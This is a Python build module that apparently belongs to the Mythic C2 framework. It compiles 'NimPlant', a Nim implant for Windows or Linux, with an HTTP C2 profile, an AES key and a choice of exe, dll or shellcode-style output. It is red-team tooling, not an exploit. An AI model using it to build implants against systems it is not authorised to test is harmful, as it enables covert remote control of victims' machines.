from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import asyncio
import os
from distutils.dir_util import copy_tree
import tempfile
import zipfile

class NimPlant(PayloadType):
    name = "nimplant"  # name that would show up in the UI
    file_extension = "zip"  # default file extension to use when creating payloads
    author = "@NotoriousRebel"  # author of the payload type (2.3 update by mmmmcoffee)
    supported_os = [  # supported OS and architecture combos
        SupportedOS.Windows, SupportedOS.Linux
    ]
    version = "2"
    wrapper = False
    wrapped_payloads = []
    note = "A fully featured cross-platform implant written in Nim"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(name="os", parameter_type=BuildParameterType.ChooseOne, description="Choose the target OS",
                             choices=["windows", "linux"]),
        BuildParameter(name="lang", parameter_type=BuildParameterType.ChooseOne,
                               description="Choose the language implant will be compiled in",
                               choices=["C", "C++"]),
        BuildParameter(name="build", parameter_type=BuildParameterType.ChooseOne,
                                description="Choose if implant is built in debug mode or release mode if in"
                                            " debug mode source will be embedded in comments and payload is "
                                            "built in debug mode",
                                default_value="release",
                                choices=["release", "debug"]),
        BuildParameter(name="arch", parameter_type=BuildParameterType.ChooseOne,
                               choices=["x64", "x86"], default_value="x64", description="Target architecture"),
        BuildParameter(name="format", parameter_type=BuildParameterType.ChooseOne,
                                 description="Choose format for output",
                                 choices=["exe", "bin", "dll"]),
        BuildParameter(name="chunk_size", parameter_type=BuildParameterType.String, default_value="512000",
                                     description="Provide a chunk size for large files", required=False),
        BuildParameter(name="default_proxy", parameter_type=BuildParameterType.ChooseOne,                                         
                                        choices=["false", "true"],
                                        description="Use the default proxy on the system, either true or false"),
    ]
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["http"]
    support_browser_scripts = [
        BrowserScript(script_name="create_table", author="@djhohnstein")        
    ]
    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        output = ""
        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(self.agent_code_path, agent_build_path.name)
            file1 = open("{}/utils/config.nim".format(agent_build_path.name), 'r').read()
            file1 = file1.replace("%UUID%", self.uuid)
            file1 = file1.replace('%CHUNK_SIZE%', self.get_parameter('chunk_size'))
            file1 = file1.replace('%DEFAULT_PROXY%', str(self.get_parameter('default_proxy')))
            profile = None
            aespsk_val = ""
            for c2 in self.c2info:
                profile = c2.get_c2profile()['name']
                for key, val in c2.get_parameters_dict().items():
                    if key == 'AESPSK':
                        # AESPSK is defined so update val as
                        # AESPSK is a compile time defined value
                        tmp = f'"{val}"'
                        resp.build_message += "val is :" + str(val)
                        resp.build_message += "tmp is :" + str(tmp)
                        aespsk_val +=val["enc_key"]#json.loads(str(tmp.replace)("'",'"'))["enc_key"]
                        continue
                    if isinstance(val, dict):
                        file1 = file1.replace(key, val["enc_key"] if val["enc_key"] is not None else "")
                    elif not isinstance(val, str):
                        file1 = file1.replace(key, json.dumps(val))
                    else:
                        file1 = file1.replace(key, val)
                    
            with open("{}/utils/config.nim".format(agent_build_path.name), 'w') as f:
                f.write(file1)

            out_ext = '' if self.get_parameter('format') == 'bin' else '.dll' \
                      if self.get_parameter('format') == 'dll' else '.exe'

            # TODO research --passL:-W --passL:-ldl
            command = f"nim {'c' if self.get_parameter('lang') == 'C' else 'cpp'} {'--os:linux --passL:-W --passL:-ldl' if self.get_parameter('os') == 'linux' else ''} -f --d:mingw {'--d:debug --hints:on --nimcache:' + agent_build_path.name if self.get_parameter('build') == 'debug' else '--d:release --hints:off'} {'--d:AESPSK=' + aespsk_val  if len(aespsk_val) > 2 else ''} --d:ssl --opt:size --passC:-flto --passL:-flto --passL:-s {'--app:lib' if self.get_parameter('format') == 'dll' else ''} {'--embedsrc:on' if self.get_parameter('build') == 'debug' else ''} --cpu:{'amd64' if self.get_parameter('arch') == 'x64' else 'i386'} --out:{self.name}{out_ext} c2/base.nim"
                                                                                                                                                                                                                                                                                                                            
            #command = f"nim {'c' if self.get_parameter('lang') == 'C' else 'cpp'} {'--os:linux --passL:-W --passL:-ldl' if self.get_parameter('os') == 'linux' else ''} -f --d:mingw {'--d:debug --hints:on --nimcache:' + agent_build_path.name if self.get_parameter('build') == 'debug' else '--d:release --hints:off'} {'--d:AESPSK=' + aespsk_val  if len(aespsk_val) > 2 else ''} --d:ssl {'--dynlibOverride:ssl --passl:-lcrypto --passl:-lssl' if self.get_parameter('os') == 'windows' else ''} --opt:size --passC:-flto --passL:-flto --passL:-s {'--app:lib' if self.get_parameter('format') == 'dll' else ''} {'--embedsrc:on' if self.get_parameter('build') == 'debug' else ''} --cpu:{'amd64' if self.get_parameter('arch') == 'x64' else 'i386'} --out:{self.name}{out_ext} c2/base.nim"
            resp.build_message += f'command: {command} attempting to compile...'
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                    stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if stdout:
                output += f'[stdout]\n{stdout.decode()}\n'
            if stderr:
                output += f'[stderr]\n{stderr.decode()}'
            resp.build_message += f'appending output: {output}'
            resp.build_message += 'Attempting to zip output'


            # TODO use built in Linux commands to compress files as Python zipping takes too long.
            # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory-in-python
           # if self.get_parameter('build') == 'debug':
            #    zipf = zipfile.ZipFile(f'{agent_build_path.name}/{self.name}.zip', 'w', zipfile.ZIP_DEFLATED)
            #    for root, dirs, files in os.walk(agent_build_path.name):
            #        for file in files:
           #             zipf.write(os.path.join(root, file))
            #    zipf.close()
            #else:
            zipfile.ZipFile(f'{agent_build_path.name}/{self.name}.zip', 'w').write(f'{agent_build_path.name}/{self.name}{out_ext}')


            resp.payload = open(f'{agent_build_path.name}/{self.name}.zip', 'rb').read()
            resp.build_message += "Successfully Built and Zipped"
            resp.status = BuildStatus.Success
        except Exception as e:
            import traceback, sys
            
            exc_type, exc_value, exc_traceback = sys.exc_info()
            resp.set_status(BuildStatus.Error)
            resp.build_message += f"Error building payload: {e} traceback: " +\
                           repr(traceback.format_exception(exc_type, exc_value, exc_traceback))
        return resp
